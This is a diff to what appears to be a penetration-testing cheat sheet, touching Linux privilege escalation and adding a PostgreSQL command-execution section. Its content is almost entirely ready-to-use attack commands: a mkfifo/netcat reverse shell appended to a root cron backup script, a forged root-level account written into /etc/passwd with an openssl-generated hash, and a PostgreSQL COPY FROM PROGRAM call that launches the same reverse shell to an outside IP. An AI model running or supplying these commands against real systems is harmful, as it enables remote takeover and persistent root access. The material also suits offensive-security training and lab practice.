@@ -333,7 +333,7 @@ Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.
 3. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
 4. nc -lnvp 1234
  ```
- ###### Insecure file permission /etc/passwd
+###### Insecure file permission /etc/passwd
  ```
  1. check if users have write permission
  2. openssl passwd evil:
@@ -342,3 +342,20 @@ openssl passwd -1 -salt hack password123
  3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
  4. su root2, enter passwd as evil
  ```
+###### Postgresql to RCE
+```
+To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.
+
+pg_read_server_files — allow reading files
+pg_write_server_files — allow writing to files
+pg_execute_server_program — allow executing commands directly into the operating system.
+
+GRANT pg_execute_server_program TO username;
+GRANT pg_read_server_files TO username;
+GRANT pg_write_server_files TO username;
+
+
+command execution:
+CREATE TABLE shell(output text);
+COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 1234 >/tmp/f';
+```
